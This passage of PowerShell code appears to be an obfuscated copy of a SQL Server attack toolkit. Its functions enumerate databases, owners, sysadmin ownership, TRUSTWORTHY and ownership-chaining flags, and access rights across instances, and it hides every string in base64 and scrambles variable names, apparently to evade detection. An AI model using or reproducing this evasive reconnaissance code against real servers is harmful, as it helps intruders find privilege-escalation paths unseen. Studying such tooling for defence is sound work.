        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAEkAcwBTAHkAcwBhAGQAbQBpAG4A'))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AdAByAHUAcwB0AHcAbwByAHQAaAB5AF8AbwBuAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZABiAF8AYwBoAGEAaQBuAGkAbgBnAF8AbwBuAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AYgByAG8AawBlAHIAXwBlAG4AYQBiAGwAZQBkAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZQBuAGMAcgB5AHAAdABlAGQA'))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AcgBlAGEAZABfAG8AbgBsAHkA'))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGMAbwB2AGUAcgB5AF8AbQBvAGQAZQBsAF8AZABlAHMAYwA='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBOAGEAbQBlAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAFMAaQB6AGUATQBiAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABhAHMAXwBkAGIAYQBjAGMAZQBzAHMA'))))
        if($DatabaseName)
        {
            ${__/\/\/====\/=\/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGEALgBuAGEAbQBlACAAbABpAGsAZQAgACcAJABEAGEAdABhAGIAYQBzAGUATgBhAG0AZQAnAA==')))
        }
        else
        {
            ${__/\/\/====\/=\/=} = ''
        }
        if($NoDefaults)
        {
            ${/===\/==\/\/\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGEALgBuAGEAbQBlACAAbgBvAHQAIABpAG4AIAAoACcAbQBhAHMAdABlAHIAJwAsACcAdABlAG0AcABkAGIAJwAsACcAbQBzAGQAYgAnACwAJwBtAG8AZABlAGwAJwApAA==')))
        }
        else
        {
            ${/===\/==\/\/\_/=\} = ''
        }
        if($HasAccess)
        {
            ${_/\/\/=\__/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAEgAQQBTAF8ARABCAEEAQwBDAEUAUwBTACgAYQAuAG4AYQBtAGUAKQA9ADEA')))
        }
        else
        {
            ${_/\/\/=\__/=\_/==} = ''
        }
        if($SysAdminOnly)
        {
            ${/=\/\/==\_/\____/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAEkAUwBfAFMAUgBWAFIATwBMAEUATQBFAE0AQgBFAFIAKAAnAHMAeQBzAGEAZABtAGkAbgAnACwAUwBVAFMARQBSAF8AUwBOAEEATQBFACgAYQAuAG8AdwBuAGUAcgBfAHMAaQBkACkAKQA9ADEA')))
        }
        else
        {
            ${/=\/\/==\_/\____/} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        ${/=====\__/\/=\_/\} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if(${/=====\__/\/=\_/\})
        {
            ${_/\/=\/=\_______/} = ${/=====\__/\/=\_/\}.Split('.')[0]
        }
        ${_/\/\/\_/\/==\/==} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQASQBuAHMAdABhAG4AYwBlACcAIABhAHMAIABbAEkAbgBzAHQAYQBuAGMAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBkAGEAdABhAGIAYQBzAGUAXwBpAGQAIABhAHMAIABbAEQAYQB0AGEAYgBhAHMAZQBJAGQAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AbgBhAG0AZQAgAGEAcwAgAFsARABhAHQAYQBiAGEAcwBlAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAFUAUwBFAFIAXwBTAE4AQQBNAEUAKABhAC4AbwB3AG4AZQByAF8AcwBpAGQAKQAgAGEAcwAgAFsARABhAHQAYQBiAGEAcwBlAE8AdwBuAGUAcgBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkAUwBfAFMAUgBWAFIATwBMAEUATQBFAE0AQgBFAFIAKAAnAHMAeQBzAGEAZABtAGkAbgAnACwAUwBVAFMARQBSAF8AUwBOAEEATQBFACgAYQAuAG8AdwBuAGUAcgBfAHMAaQBkACkAKQAgAGEAcwAgAFsATwB3AG4AZQByAEkAcwBTAHkAcwBhAGQAbQBpAG4AXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AdAByAHUAcwB0AHcAbwByAHQAaAB5AF8AbwBuACwADQAKACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AZABiAF8AYwBoAGEAaQBuAGkAbgBnAF8AbwBuACwA')))
        if([int]${_/\/=\/=\_______/} -ge 10)
        {
            ${_/=\/\/=\______/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAGkAcwBfAGIAcgBvAGsAZQByAF8AZQBuAGEAYgBsAGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBpAHMAXwBlAG4AYwByAHkAcAB0AGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AcgBlAGEAZABfAG8AbgBsAHkALAA=')))
        }
        ${_/=\__/\/==\/\/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBjAHIAZQBhAHQAZQBfAGQAYQB0AGUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAHIAZQBjAG8AdgBlAHIAeQBfAG0AbwBkAGUAbABfAGQAZQBzAGMALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgAuAGYAaQBsAGUAbgBhAG0AZQAgAGEAcwAgAFsARgBpAGwAZQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAKABTAEUATABFAEMAVAAgAEMAQQBTAFQAKABTAFUATQAoAHMAaQB6AGUAKQAgACoAIAA4AC4AIAAvACAAMQAwADIANAAgAEEAUwAgAEQARQBDAEkATQBBAEwAKAA4ACwAMgApACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAcgBvAG0AIABzAHkAcwAuAG0AYQBzAHQAZQByAF8AZgBpAGwAZQBzACAAdwBoAGUAcgBlACAAbgBhAG0AZQAgAGwAaQBrAGUAIABhAC4AbgBhAG0AZQApACAAYQBzACAAWwBEAGIAUwBpAHoAZQBNAGIAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABIAEEAUwBfAEQAQgBBAEMAQwBFAFMAUwAoAGEALgBuAGEAbQBlACkAIABhAHMAIABbAGgAYQBzAF8AZABiAGEAYwBjAGUAcwBzAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEYAUgBPAE0AIABbAHMAeQBzAF0ALgBbAGQAYQB0AGEAYgBhAHMAZQBzAF0AIABhAA0ACgAgACAAIAAgACAAIAAgACAASQBOAE4ARQBSACAASgBPAEkATgAgAFsAcwB5AHMAXQAuAFsAcwB5AHMAZABhAHQAYQBiAGEAcwBlAHMAXQAgAGIAIABPAE4AIABhAC4AZABhAHQAYQBiAGEAcwBlAF8AaQBkACAAPQAgAGIALgBkAGIAaQBkACAAVwBIAEUAUgBFACAAMQA9ADEA')))
        ${_/\/\___/\/\/\/==} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewBfAF8ALwBcAC8AXAAvAD0APQA9AD0AXAAvAD0AXAAvAD0AfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AC8APQA9AD0AXAAvAD0APQBcAC8AXAAvAFwAXwAvAD0AXAB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwAvAFwALwBcAC8APQBcAF8AXwAvAD0AXABfAC8APQA9AH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewAvAD0AXAAvAFwALwA9AD0AXABfAC8AXABfAF8AXwBfAC8AfQANAAoAIAAgACAAIAAgACAAIAAgAE8AUgBEAEUAUgAgAEIAWQAgAGEALgBkAGEAdABhAGIAYQBzAGUAXwBpAGQA')))
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAC8AXAAvAFwAXwAvAFwALwA9AD0AXAAvAD0APQB9ACAAJAB7AF8ALwA9AFwALwBcAC8APQBcAF8AXwBfAF8AXwBfAC8APQB9ACAAJAB7AF8ALwA9AFwAXwBfAC8AXAAvAD0APQBcAC8AXAAvAFwALwB9ACAAJAB7AF8ALwBcAC8AXABfAF8AXwAvAFwALwBcAC8AXAAvAD0APQB9AA==')))
        ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_____/\/\/=\__} |
        % -Process {
            if([int]${_/\/=\/=\_______/} -ge 10)
            {
                ${/=\/=\/\_/\_/=\__} = $_.is_broker_enabled
                ${/===\___/\__/=\_/} = $_.is_encrypted
                ${/==\/\___/=\_/=\/} = $_.is_read_only
            }
            else
            {
                ${/=\/=\/\_/\_/=\__} = 'NA'
                ${/===\___/\__/=\_/} = 'NA'
                ${/==\/\___/=\_/=\/} = 'NA'
            }
            $null = ${/=\_____/\__/=\/\}.Rows.Add(
                $_.ComputerName,
                $_.Instance,
                $_.DatabaseId,
                $_.DatabaseName,
                $_.DatabaseOwner,
                $_.OwnerIsSysadmin,
                $_.is_trustworthy_on,
                $_.is_db_chaining_on,
                ${/=\/=\/\_/\_/=\__},
                ${/===\___/\__/=\_/},
                ${/==\/\___/=\_/=\/},
                $_.create_date,
                $_.recovery_model_desc,
                $_.FileName,
                $_.DbSizeMb,
                $_.has_dbaccess
            )
        }
    }
    End
    {
        ${/=\_____/\__/=\/\}
    }
}
Function  Get-SQLDatabaseThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases the current user has access to.')]
        [switch]$HasAccess,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases owned by a sysadmin.')]
        [switch]$SysAdminOnly,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 2,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\__/=\/\} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAEkAZAA='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE8AdwBuAGUAcgA='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAEkAcwBTAHkAcwBhAGQAbQBpAG4A'))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AdAByAHUAcwB0AHcAbwByAHQAaAB5AF8AbwBuAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZABiAF8AYwBoAGEAaQBuAGkAbgBnAF8AbwBuAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AYgByAG8AawBlAHIAXwBlAG4AYQBiAGwAZQBkAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZQBuAGMAcgB5AHAAdABlAGQA'))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AcgBlAGEAZABfAG8AbgBsAHkA'))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGMAbwB2AGUAcgB5AF8AbQBvAGQAZQBsAF8AZABlAHMAYwA='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBOAGEAbQBlAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAFMAaQB6AGUATQBiAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABhAHMAXwBkAGIAYQBjAGMAZQBzAHMA'))))
        if($DatabaseName)
        {
            ${__/\/\/====\/=\/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGEALgBuAGEAbQBlACAAbABpAGsAZQAgACcAJABEAGEAdABhAGIAYQBzAGUATgBhAG0AZQAnAA==')))
        }
        else
        {
            ${__/\/\/====\/=\/=} = ''
        }
        if($NoDefaults)
        {
            ${/===\/==\/\/\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGEALgBuAGEAbQBlACAAbgBvAHQAIABpAG4AIAAoACcAbQBhAHMAdABlAHIAJwAsACcAdABlAG0AcABkAGIAJwAsACcAbQBzAGQAYgAnACwAJwBtAG8AZABlAGwAJwApAA==')))
        }
        else
        {
            ${/===\/==\/\/\_/=\} = ''
        }
        if($HasAccess)
        {
            ${_/\/\/=\__/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAEgAQQBTAF8ARABCAEEAQwBDAEUAUwBTACgAYQAuAG4AYQBtAGUAKQA9ADEA')))
        }
        else
        {
            ${_/\/\/=\__/=\_/==} = ''
        }
        if($SysAdminOnly)
        {
            ${/=\/\/==\_/\____/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAEkAUwBfAFMAUgBWAFIATwBMAEUATQBFAE0AQgBFAFIAKAAnAHMAeQBzAGEAZABtAGkAbgAnACwAUwBVAFMARQBSAF8AUwBOAEEATQBFACgAYQAuAG8AdwBuAGUAcgBfAHMAaQBkACkAKQA9ADEA')))
        }
        else
        {
            ${/=\/\/==\_/\____/} = ''
        }
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
            }
            if(${__/\_/=\/==\_/=\_})
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                return
            }
            ${/=====\__/\/=\_/\} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
            if(${/=====\__/\/=\_/\})
            {
                ${_/\/=\/=\_______/} = ${/=====\__/\/=\_/\}.Split('.')[0]
            }
            ${_/\/\/\_/\/==\/==} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AZABhAHQAYQBiAGEAcwBlAF8AaQBkACAAYQBzACAAWwBEAGEAdABhAGIAYQBzAGUASQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AbgBhAG0AZQAgAGEAcwAgAFsARABhAHQAYQBiAGEAcwBlAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAVQBTAEUAUgBfAFMATgBBAE0ARQAoAGEALgBvAHcAbgBlAHIAXwBzAGkAZAApACAAYQBzACAAWwBEAGEAdABhAGIAYQBzAGUATwB3AG4AZQByAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAFMAXwBTAFIAVgBSAE8ATABFAE0ARQBNAEIARQBSACgAJwBzAHkAcwBhAGQAbQBpAG4AJwAsAFMAVQBTAEUAUgBfAFMATgBBAE0ARQAoAGEALgBvAHcAbgBlAHIAXwBzAGkAZAApACkAIABhAHMAIABbAE8AdwBuAGUAcgBJAHMAUwB5AHMAYQBkAG0AaQBuAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AdAByAHUAcwB0AHcAbwByAHQAaAB5AF8AbwBuACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBpAHMAXwBkAGIAXwBjAGgAYQBpAG4AaQBuAGcAXwBvAG4ALAA=')))
            if([int]${_/\/=\/=\_______/} -ge 10)
            {
                ${_/=\/\/=\______/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AYgByAG8AawBlAHIAXwBlAG4AYQBiAGwAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AZQBuAGMAcgB5AHAAdABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AcgBlAGEAZABfAG8AbgBsAHkALAA=')))
            }
            ${_/=\__/\/==\/\/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAGMAcgBlAGEAdABlAF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgByAGUAYwBvAHYAZQByAHkAXwBtAG8AZABlAGwAXwBkAGUAcwBjACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgAuAGYAaQBsAGUAbgBhAG0AZQAgAGEAcwAgAFsARgBpAGwAZQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAoAFMARQBMAEUAQwBUACAAQwBBAFMAVAAoAFMAVQBNACgAcwBpAHoAZQApACAAKgAgADgALgAgAC8AIAAxADAAMgA0ACAAQQBTACAARABFAEMASQBNAEEATAAoADgALAAyACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABmAHIAbwBtACAAcwB5AHMALgBtAGEAcwB0AGUAcgBfAGYAaQBsAGUAcwAgAHcAaABlAHIAZQAgAG4AYQBtAGUAIABsAGkAawBlACAAYQAuAG4AYQBtAGUAKQAgAGEAcwAgAFsARABiAFMAaQB6AGUATQBiAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIAEEAUwBfAEQAQgBBAEMAQwBFAFMAUwAoAGEALgBuAGEAbQBlACkAIABhAHMAIABbAGgAYQBzAF8AZABiAGEAYwBjAGUAcwBzAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgAFsAcwB5AHMAXQAuAFsAZABhAHQAYQBiAGEAcwBlAHMAXQAgAGEADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkATgBOAEUAUgAgAEoATwBJAE4AIABbAHMAeQBzAF0ALgBbAHMAeQBzAGQAYQB0AGEAYgBhAHMAZQBzAF0AIABiACAATwBOACAAYQAuAGQAYQB0AGEAYgBhAHMAZQBfAGkAZAAgAD0AIABiAC4AZABiAGkAZAAgAFcASABFAFIARQAgADEAPQAxAA==')))
            ${_/\/\___/\/\/\/==} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AF8AXwAvAFwALwBcAC8APQA9AD0APQBcAC8APQBcAC8APQB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewAvAD0APQA9AFwALwA9AD0AXAAvAFwALwBcAF8ALwA9AFwAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwAvAFwALwBcAC8APQBcAF8AXwAvAD0AXABfAC8APQA9AH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AC8APQBcAC8AXAAvAD0APQBcAF8ALwBcAF8AXwBfAF8ALwB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAFIARABFAFIAIABCAFkAIABhAC4AZABhAHQAYQBiAGEAcwBlAF8AaQBkAA==')))
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAC8AXAAvAFwAXwAvAFwALwA9AD0AXAAvAD0APQB9ACAAJAB7AF8ALwA9AFwALwBcAC8APQBcAF8AXwBfAF8AXwBfAC8APQB9ACAAJAB7AF8ALwA9AFwAXwBfAC8AXAAvAD0APQBcAC8AXAAvAFwALwB9ACAAJAB7AF8ALwBcAC8AXABfAF8AXwAvAFwALwBcAC8AXAAvAD0APQB9AA==')))
            ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${/=\_____/\/\/=\__} |
            % -Process {
                if([int]${_/\/=\/=\_______/} -ge 10)
                {
                    ${/=\/=\/\_/\_/=\__} = $_.is_broker_enabled
                    ${/===\___/\__/=\_/} = $_.is_encrypted
                    ${/==\/\___/=\_/=\/} = $_.is_read_only
                }
                else
                {
                    ${/=\/=\/\_/\_/=\__} = 'NA'
                    ${/===\___/\__/=\_/} = 'NA'
                    ${/==\/\___/=\_/=\/} = 'NA'
                }
                $null = ${/=\_____/\__/=\/\}.Rows.Add(
                    $_.ComputerName,
                    $_.Instance,
                    $_.DatabaseId,
                    $_.DatabaseName,
                    $_.DatabaseOwner,
                    $_.OwnerIsSysadmin,
                    $_.is_trustworthy_on,
                    $_.is_db_chaining_on,
                    ${/=\/=\/\_/\_/=\__},
                    ${/===\___/\__/=\_/},
                    ${/==\/\___/=\_/=\/},
                    $_.create_date,
                    $_.recovery_model_desc,
                    $_.FileName,
                    $_.DbSizeMb,
                    $_.has_dbaccess
                )
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${/=\_____/\__/=\/\}
    }
}
Function  Get-SQLTable
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
